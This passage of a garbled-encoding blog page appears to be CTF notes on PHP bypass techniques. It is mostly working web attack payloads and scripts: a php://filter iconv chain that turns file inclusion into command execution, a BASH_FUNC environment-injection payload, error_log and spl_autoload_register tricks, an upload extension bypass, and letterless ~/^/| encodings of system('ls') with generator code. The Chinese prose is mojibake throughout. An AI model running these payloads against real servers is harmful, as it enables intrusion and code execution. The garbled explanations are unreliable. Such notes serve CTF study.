class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></li><li><p><strong>CNEXT exploits</strong></p><p>CVE-2024-2961ï¼šå°†phpfilterä»»æ„æ–‡ä»¶è¯»å–æå‡ä¸ºè¿œç¨‹ä»£ç æ‰§è¡Œ</p><p>å‚è€ƒï¼š</p><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14690">ã€ç¿»è¯‘ã€‘ä»è®¾ç½®å­—ç¬¦é›†åˆ°RCEï¼šåˆ©ç”¨ GLIBC æ”»å‡» PHP å¼•æ“ï¼ˆç¯‡ä¸€ï¼‰</a></p><p>åŸä½œè€…ç»™å‡ºçš„exp:</p><p><a target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py</a></p></li></ul><h3 id="die-exit"><a href="#die-exit" class="headerlink" title="die() / exit()"></a>die() / exit()</h3><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202510">https://www.anquanke.com/post/id/202510</a></p><ul><li><p>è¿‡æ»¤å…³é”®è¯</p><p>urlencode</p></li><li><p>è¿‡æ»¤<code>%25</code></p><p>äºŒæ¬¡ç¼–ç ï¼š<code>a:%6%31 b:%6%32 i:%6%39 q:%7%31 r:%7%32 u:%7%35 U:%5%35</code></p></li><li><p>allow_url_include=Off</p><blockquote><p>file_get_contents å…è®¸ä½¿ç”¨ data URIï¼Œä¼šç›´æ¥è¿”å›åé¢çš„å†…å®¹ï¼Œå¾ˆå¥‡æ€ªçš„æ˜¯ï¼Œåœ¨ allow_url_include=Off çš„æƒ…å†µä¸‹ï¼Œä¸å…è®¸ require_once data URI çš„ï¼Œä½†æ˜¯å¦‚æœ <code>data:,XXX</code> æ˜¯ä¸€ä¸ªç›®å½•åçš„è¯ï¼Œå°±ä¼šæ”¾å¼€é™åˆ¶ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; <span class="built_in">echo</span> file_get_contents(<span class="string">&#x27;data:,123456/ricky&#x27;</span>);</span><br><span class="line">123456/ricky</span><br><span class="line">php &gt; <span class="built_in">echo</span> require_once(<span class="string">&#x27;data:,123456/ricky&#x27;</span>);</span><br><span class="line">flag&#123;xxxxxxxxxx&#125;</span><br><span class="line">php &gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="open"><a href="#open" class="headerlink" title="open()"></a>open()</h3><p>PHPåŸç”Ÿç±»ï¼š<code>ZipArchive::open($filename,$flags)</code></p><p>è°ƒç”¨å¯åˆ é™¤æ–‡ä»¶ï¼š<code>ZipArchive::open(&#39;xxx&#39;,ZipArchive::OVERWRITE)</code>=<code>ZipArchive::open(&#39;xxx&#39;,8)</code></p><h3 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url()"></a>parse_url()</h3><blockquote><p>URL æ ¼å¼ï¼š <code>scheme://user:password@address:port/path?query#fragment</code></p></blockquote><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11137159.html">https://www.cnblogs.com/tr1ple/p/11137159.html</a></p><ul><li><p>//ç»•è¿‡</p><p>æŠŠ//è®¤ä¸ºæ˜¯ç›¸å¯¹è·¯å¾„ï¼ˆPHP&lt;5.4.7ï¼‰ã€‚</p><p>å¦‚æœæ˜¯//ï¼Œåˆ™è¢«è§£ææˆhostï¼Œåé¢çš„å†…å®¹å¦‚æœæœ‰/ï¼Œè¢«è§£æå‡ºpathï¼Œè€Œä¸æ˜¯queryäº†ã€‚</p></li><li><p>///ç»•è¿‡</p><p>ä¸‰ä¸ªæ–œæ å¯¼è‡´ä¸¥é‡ä¸åˆæ ¼çš„URLï¼Œparse_url() è¿”å›FALSEã€‚</p></li></ul><h3 id="basename"><a href="#basename" class="headerlink" title="basename()"></a>basename()</h3><p>è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ï¼Œä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ã€‚</p><p><code>var_dump(basename(&quot;\xffconfig.php&quot;)); =&gt; config.php</code></p><p><code>var_dump(basename(&quot;config.php\xff&quot;)); =&gt; config.php</code></p><h3 id="spl-autoload-register"><a href="#spl-autoload-register" class="headerlink" title="spl_autoload_register()"></a>spl_autoload_register()</h3><p>PHPæ¡†æ¶ä¸­æœ‰è‡ªåŠ¨åŠ è½½æœºåˆ¶ï¼Œautoloadæœºåˆ¶å¯ä»¥ä½¿å¾—PHPç¨‹åºæœ‰å¯èƒ½åœ¨ä½¿ç”¨ç±»æ—¶æ‰è‡ªåŠ¨åŒ…å«ç±»æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ä¸€å¼€å§‹å°±å°†æ‰€æœ‰çš„ç±»æ–‡ä»¶includeè¿›æ¥ï¼Œè¿™ç§æœºåˆ¶ä¹Ÿç§°ä¸ºlazy loadingã€‚</p><p>autoloadå¤§è‡´å¯ä»¥ä½¿ç”¨ä¸¤ç§æ–¹æ³•ï¼š<code>__autoload</code> å’Œ <code>spl</code> æ–¹æ³•ã€‚</p><p>splçš„autoloadç³»åˆ—å‡½æ•°ä½¿ç”¨ä¸€ä¸ªautoloadè°ƒç”¨å †æ ˆï¼Œå¯ä»¥ä½¿ç”¨ <code>spl_autoload_register</code> æ³¨å†Œå¤šä¸ªè‡ªå®šä¹‰çš„autoloadå‡½æ•°ã€‚</p><p><code>spl_autoload_register()</code> å¦‚æœä¸æŒ‡å®šå‚æ•°ï¼Œå°±ä¼šè‡ªåŠ¨åŒ…å« <code>ç±»å.php</code> æˆ– <code>ç±»å.inc</code> çš„æ–‡ä»¶ï¼Œå¹¶åŠ è½½å…¶ä¸­çš„â€œç±»åâ€ç±»ã€‚</p><p>a. ä¸Šä¼ webshellï¼Œåç¼€ä¸º <code>.inc</code>ï¼Œè¢«é‡å‘½åä¸º <code>xxxx.inc</code>ï¼›</p><p>b. åºåˆ—åŒ–ä¸€ä¸ªç±»åä¸º <code>xxxx</code> çš„ç±»å¯¹è±¡ï¼›</p><p>c. å°†åºåˆ—åŒ–ä»¥åçš„å­—ç¬¦ä¸²ä½œä¸ºcookieï¼Œå‘é€åˆ°æœåŠ¡å™¨ä¸Šï¼›</p><p>d. æœåŠ¡å™¨ååºåˆ—åŒ–è¿™ä¸ªå­—ç¬¦ä¸²åï¼Œå°†ä¼šè‡ªåŠ¨åŠ è½½ <code>xxxx</code> ç±»ï¼Œç”±äºä¹‹å‰ <code>spl_autoload_register</code> å‡½æ•°æ³¨å†Œçš„æ–¹æ³•ï¼Œä¼šè‡ªåŠ¨åŠ è½½ <code>xxxx.inc</code>ï¼Œä»è€Œé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">ls</span>();</span><br></pre></td></tr></table></figure><p>å½“ <code>spl_autoload_register</code> çš„å‚æ•°ä¸ä¸ºç©ºæ—¶ï¼Œnewä¸€ä¸ªç±» <code>ls</code>ï¼Œå¦‚æœè¯¥ <code>ls</code> ç±»æœªå®šä¹‰ï¼Œç¨‹åºä¼šå¯»æ‰¾<br><code>system</code> å‡½æ•°ï¼Œå¹¶å°† <code>ls</code> ä½œä¸ºå‚æ•°ï¼Œæ‰§è¡Œ <code>system</code> å‡½æ•°ï¼Œå³æ‰§è¡Œäº† <code>system(&#39;ls&#39;);</code>ã€‚</p><p>å½“ <code>spl_autoload_register</code> çš„å‚æ•°ä¸ºç©ºæ—¶ã€‚ç„¶ånewä¸€ä¸ªxxxç±»ï¼Œå¦‚æœè¯¥xxxç±»æœªå®šä¹‰ï¼Œç¨‹åºä¼šåœ¨<br>å·¥ä½œç©ºé—´ä¸­å¯»æ‰¾ <code>xxx.php</code> æˆ– <code>xxx.inc</code>ï¼Œå¹¶å°†å…¶åŒ…å«ã€‚</p><h3 id="putenv-system"><a href="#putenv-system" class="headerlink" title="putenv()+system()"></a>putenv()+system()</h3><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://tttang.com/archive/1450/">æˆ‘æ˜¯å¦‚ä½•åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥æ‰§è¡Œä»»æ„å‘½ä»¤</a></p><p><code>envs[BASH_FUNC_echo%25%25]=()%20{%20id;%20}</code></p><h3 id="ini-set"><a href="#ini-set" class="headerlink" title="ini_set()"></a>ini_set()</h3><p><code>ini_set($name,$value);</code> =&gt; <code>name=error_log&amp;value=/var/www/html/out.php</code></p><h3 id="mb-strpos-mb-substr"><a href="#mb-strpos-mb-substr" class="headerlink" title="mb_strpos()+mb_substr()"></a>mb_strpos()+mb_substr()</h3><p>åˆ©ç”¨mb_strposä¸mb_substrè¿™ä¸¤ä¸ªå‡½æ•°å¯¹æŸäº›ä¸å¯è§å­—ç¬¦çš„è§£æå·®å¼‚å¯¼è‡´çš„ï¼Œå¯ä»¥åˆ©ç”¨ç‰¹æ®Šçš„ä¸å¯è§å­—ç¬¦å®ç°ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ã€‚</p><p>å½“ä»¥ <code>\xf0</code> å¼€å¤´çš„å­—èŠ‚åºåˆ—å‡ºç°åœ¨ UTF-8 ç¼–ç ä¸­æ—¶ï¼Œé€šå¸¸è¡¨ç¤ºä¸€ä¸ªå››å­—èŠ‚çš„ Unicode å­—ç¬¦ã€‚è¿™æ˜¯å› ä¸º UTF-8 ç¼–ç è§„èŒƒå®šä¹‰äº†ä»¥ <code>\xf0</code> å¼€å¤´çš„å­—èŠ‚åºåˆ—ç”¨äºç¼–ç è¾ƒå¤§çš„ Unicode å­—ç¬¦ã€‚</p><ul><li><p>æ¯å‘é€ä¸€ä¸ª <code>%f0abc</code>ï¼Œ<code>mb_strpos()</code> è®¤ä¸ºæ˜¯4ä¸ªå­—èŠ‚ï¼Œ<code>mb_substr()</code> è®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®3ä¸ªå­—èŠ‚ï¼ˆå‘åç§»åŠ¨3ä½ï¼‰ï¼›</p></li><li><p>æ¯å‘é€ä¸€ä¸ª <code>%f0%9fab</code>ï¼Œ<code>mb_strpos()</code> è®¤ä¸ºæ˜¯3ä¸ªå­—èŠ‚ï¼Œ<code>mb_substr()</code> è®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®2ä¸ªå­—èŠ‚ï¼ˆå‘åç§»åŠ¨2ä½ï¼‰ï¼›</p></li><li><p>æ¯å‘é€ä¸€ä¸ª <code>%f0%9f%9fa</code>ï¼Œ<code>mb_strpos()</code> è®¤ä¸ºæ˜¯2ä¸ªå­—èŠ‚ï¼Œ<code>mb_substr()</code> è®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®1ä¸ªå­—èŠ‚ï¼ˆå‘åç§»åŠ¨1ä½ï¼‰ï¼›</p></li><li>æ¯å‘é€ä¸€ä¸ª <code>%9f</code>ï¼Œ<code>`mb_strpos()</code> ä¼šå¿½ç•¥ï¼Œ<code>mb_substr()</code> è®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®1ä¸ªå­—èŠ‚ï¼ˆå‘å‰ç§»åŠ¨1ä½ï¼‰ã€‚</li></ul><p>ç»“è®ºï¼š<code>mb_strpos()</code> ç›¸å¯¹äº <code>mb_substr()</code> æ¥è¯´ï¼Œå¯ä»¥æŠŠç´¢å¼•å€¼å‘åç§»åŠ¨ã€‚</p><p>å‚è€ƒï¼š</p><p><a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/joomla-multiple-xss-vulnerabilities/">https://www.sonarsource.com/blog/joomla-multiple-xss-vulnerabilities/</a></p><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18187578">https://www.cnblogs.com/gxngxngxn/p/18187578 é€ƒè·‘å¤§å¸ˆ</a></p><h3 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file()"></a>move_uploaded_file()</h3><p>å½“move_uploaded_fileå‡½æ•°å‚æ•°å¯æ§æ—¶ï¼Œå¯ä»¥å°è¯• <code>/.</code> ç»•è¿‡ï¼Œå› ä¸ºè¯¥å‡½æ•°ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„ <code>/.</code>ï¼Œæ‰€ä»¥å¯ä»¥æ„é€  <code>save_path=1.php/.</code>,è¿™æ ·file_extå€¼å°±ä¸ºç©ºï¼Œå°±èƒ½ç»•è¿‡é»‘åå•ï¼Œè€Œmove_uploaded_fileå‡½æ•°å¿½ç•¥æ–‡ä»¶æœ«å°¾çš„ <code>/.</code> å¯ä»¥å®ç°ä¿å­˜æ–‡ä»¶ä¸º <code>.php</code>ã€‚</p><h3 id="å‚æ•°ç‰¹æ€§"><a href="#å‚æ•°ç‰¹æ€§" class="headerlink" title="å‚æ•°ç‰¹æ€§"></a>å‚æ•°ç‰¹æ€§</h3><p><img src="/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/1567560448_5d6f13004035f.jpeg" alt="img" style="zoom:50%"></p><ul><li><p>å‚æ•°ä¸­çš„<code>+</code>ã€<code>[</code>ã€ç©ºæ ¼ã€<code>.</code>å‡ä¼šå˜ä¸º<code>_</code></p></li><li><p>å‚æ•°å½¢å¼<code>A_B.C</code>ï¼šä½¿ç”¨<code>A[B.C</code>ä¼ å…¥</p><p>â€‹</p></li></ul><h3 id="æ— å­—æ¯-æ•°å­—-ç‰¹å®šç¬¦å·RCE"><a href="#æ— å­—æ¯-æ•°å­—-ç‰¹å®šç¬¦å·RCE" class="headerlink" title="æ— å­—æ¯/æ•°å­—/ç‰¹å®šç¬¦å·RCE"></a>æ— å­—æ¯/æ•°å­—/ç‰¹å®šç¬¦å·RCE</h3><ul><li><p>å–åï¼ˆ<code>~</code>ï¼‰</p><p><code>phpinfo()</code> â†’ <code>(~%8F%97%8F%96%91%99%90)()</code></p><p><code>system(&#39;ls&#39;)</code> â†’ <code>(~%8C%86%8C%8B%9A%92)(~%93%8C)</code></p></li><li><p>å¼‚æˆ–ï¼ˆ<code>^</code>ï¼‰</p><p><code>phpinfo()</code> â†’ <code>$_GET[x]&amp;x=phpinfo</code> â†’ <code>${%A0%A0%A0%A0^%FF%E7%E5%F4}{x}();&x=phpinfo</code></p><p><code>system(&#39;ls&#39;)</code> â†’ <code>$_GET[x]($_GET[y])&amp;x=system&amp;y=ls</code> â†’ <code>${%A0%A0%A0%A0^%FF%E7%E5%F4}{x}(${%A0%A0%A0%A0^%FF%E7%E5%F4}{y});&x=system&y=ls</code></p><p>æ— å­—æ¯æƒ…å½¢ï¼š</p><p><code>phpinfo()</code> â†’ <code>(&#39;484880800&#39;^&#39;8.8-**)00&#39;^&#39;|~||||~()&#39;)</code></p><p><code>system(&#39;ls&#39;)</code> â†’ <code>(&#39;404008008400&#39;^&#39;9598))08*980&#39;^&#39;~|~|||(*~~*)&#39;)</code></p></li><li><p>æˆ–ï¼ˆ<code>|</code>ï¼‰</p><p>å¯ä»¥ç›´æ¥å°†éœ€è¦æ„é€ çš„å­—ç¬¦ä¸²ä¸åå¼•å·è¿›è¡Œ<strong>å¼‚æˆ–</strong>ï¼Œå¾—åˆ°çš„ç»“æœå†ä¸åå¼•å·ç›¸<strong>æˆ–</strong>å³å¯å¾—åˆ°åŸå­—ç¬¦ä¸²ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;````````&quot;</span>^<span class="string">&quot;readfile&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;````&quot;</span>^<span class="string">&quot;flag&quot;</span>;</span><br></pre></td></tr></table></figure><p>payloadä¾‹ï¼šï¼ˆ<code>readfile(&quot;/flag&quot;)</code>ï¼‰</p><p><code>$code = &quot;(&#39;````````&#39;|&#39; &#39;)(&#39;/````&#39;|&#39;/ &#39;));//&quot;;</code></p><p>å‚è€ƒï¼š</p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p>æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* author yu22x */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span 